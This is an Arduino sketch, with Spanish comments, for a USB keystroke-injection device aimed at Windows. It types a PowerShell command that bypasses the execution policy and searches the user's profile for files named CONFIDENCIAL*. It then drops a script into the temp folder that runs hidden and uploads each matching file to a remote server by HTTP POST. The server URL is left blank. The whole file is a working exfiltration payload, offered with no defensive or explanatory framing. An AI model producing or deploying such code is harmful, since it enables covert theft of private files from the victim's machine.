#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void tipearSeguro(String texto) {
  for (int i = 0; i < texto.length(); i++) {
    Keyboard.write(texto[i]);
    delay(1);
  }
}

void setup() {
  USB.begin();
  Keyboard.begin();
  
  delay(4000);
  Keyboard.releaseAll();  
  delay(100);

  Keyboard.press(KEY_LEFT_GUI); 
  Keyboard.press('r');
  delay(150);
  Keyboard.releaseAll();
  delay(800); 

  tipearSeguro("powershell -NoProfile -ExecutionPolicy Bypass");
  delay(150);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(4000);

  // URL DEL SERVIDOR EN DONDE VIAJARA LA SOLICITUD POST.
  String url = "";

  String comando =
    "$s='"
    "$archivos=@(''CONFIDENCIAL*.*'');"
    "$rutas=[System.Collections.Generic.List[string]]::new();"
    "foreach($a in $archivos){"
    "  $r=Get-ChildItem -Path $env:USERPROFILE -Recurse -Filter $a -ErrorAction SilentlyContinue;"
    "  if($r){foreach($item in $r){$rutas.Add($item.FullName);}}"
    "};"
    "if($rutas.Count -gt 0){"
    "  Add-Type -AssemblyName System.Net.Http;"
    "  $client=New-Object System.Net.Http.HttpClient;"
    "  foreach($ruta in $rutas){"
    "    $bytes=[System.IO.File]::ReadAllBytes($ruta);"
    "    $content=New-Object System.Net.Http.ByteArrayContent(,$bytes);"
    "    $form=New-Object System.Net.Http.MultipartFormDataContent;"
    "    $form.Add($content,''file'',[System.IO.Path]::GetFileName($ruta));"
    "    $client.PostAsync(''" + url + "'',$form).Wait();"
    "  };"
    "  $client.Dispose();"
    "};"
    "';"
    "$p=$env:TEMP+'\\collect.ps1';$s|Out-File -FilePath $p -Encoding UTF8;"
    "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File',$p -WindowStyle Hidden;"
    "exit";

  tipearSeguro(comando);
  delay(150);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {}